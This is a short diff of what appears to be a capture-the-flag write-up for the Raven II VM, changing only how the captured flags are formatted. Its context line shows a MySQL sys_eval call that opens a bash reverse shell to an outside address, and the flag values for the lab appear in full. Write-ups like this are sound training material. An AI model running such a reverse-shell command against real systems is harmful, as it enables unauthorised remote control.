@@ -1336,10 +1336,10 @@ mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'
 root@Raven:/var/www/html/vendor# cat PATH
 cat PATH
 /var/www/html/vendor/
-flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+|flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}|
 root@Raven:/var/www# cat flag2.txt
 cat flag2.txt
-flag2{6a8ed560f0b5358ecf844108048eb337}
+|flag2{6a8ed560f0b5358ecf844108048eb337}|
 root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/> 11# ls -al
 ls -al
 total 20
@@ -1355,7 +1355,7 @@ cat flag4.txt
  | _ \__ ___ _____ _ _ |_ _|_ _|
  |   / _` \ V / -_) ' \ | | | |
  |_|_\__,_|\_/\___|_||_|___|___|
-flag4{df2bc5e951d91581467bb9a2a8ff4425}
+|flag4{df2bc5e951d91581467bb9a2a8ff4425}|
 CONGRATULATIONS on successfully rooting RavenII
 I hope you enjoyed this second interation of the Raven VM
 Hit me up on Twitter and let me know what you thought:
